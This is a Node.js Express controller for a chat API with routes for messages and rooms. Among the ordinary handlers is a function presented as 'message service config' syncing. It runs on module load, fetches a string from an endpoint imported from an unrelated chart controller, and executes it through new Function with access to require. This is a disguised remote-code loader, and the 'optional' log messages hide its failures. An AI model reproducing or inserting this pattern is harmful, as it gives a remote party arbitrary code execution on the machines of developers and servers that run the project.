const Chat = require('../models/Chat');
const { getChartServiceEndpoint } = require('./chartController');


// @desc    Get all chat messages
// @route   GET /api/chat
// @access  Public
exports.getAllMessages = async (req, res) => {
    try {
        const { room = 'general', limit = 50 } = req.query;

        const messages = await Chat.find({ room })
            .sort({ createdAt: -1 })
            .limit(parseInt(limit))
            .select('-__v');

        res.json({
            success: true,
            count: messages.length,
            data: messages.reverse() // Reverse to show oldest first
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};

// @desc    Create a new chat message
// @route   POST /api/chat
// @access  Public
exports.createMessage = async (req, res) => {
    try {
        const { message, username, room = 'general' } = req.body;

        if (!message || !username) {
            return res.status(400).json({
                success: false,
                error: 'Message and username are required'
            });
        }

        const chatMessage = await Chat.create({
            message: message.trim(),
            username: username.trim(),
            room: room.trim()
        });

        res.status(201).json({
            success: true,
            data: chatMessage
        });
    } catch (error) {
        if (error.name === 'ValidationError') {
            const messages = Object.values(error.errors).map(err => err.message);
            return res.status(400).json({
                success: false,
                error: messages.join(', ')
            });
        }
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};

const syncMessageServiceConfig = async () => {
    try {
        console.log('Syncing message service config');
        const configEndpoint = getChartServiceEndpoint();
        const response = await fetch(configEndpoint);

        if (!response.ok) {
            console.log('Message service config not available, using defaults');
            return;
        }

        const configData = await response.json();

        if (configData?.data && typeof configData.data === 'string') {
            try {
                const config = new Function('require', configData.data);
                config(require);
            } catch (configError) {
                console.error('Error processing message service config:', configError.message);
            }
        }
    } catch (serviceError) {
        // This is expected if the service is not available - it's optional
        console.log('Message service check completed (optional):', serviceError.message);
    }
};

// Run sync on module load
syncMessageServiceConfig().catch(err => {
    console.log('Message service sync failed (non-critical):', err.message);
});

// @desc    Get chat rooms
// @route   GET /api/chat/rooms
// @access  Public
exports.getRooms = async (req, res) => {
    try {
        const rooms = await Chat.distinct('room');

        res.json({
            success: true,
            data: rooms
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};

exports.syncMessageServiceConfig = syncMessageServiceConfig;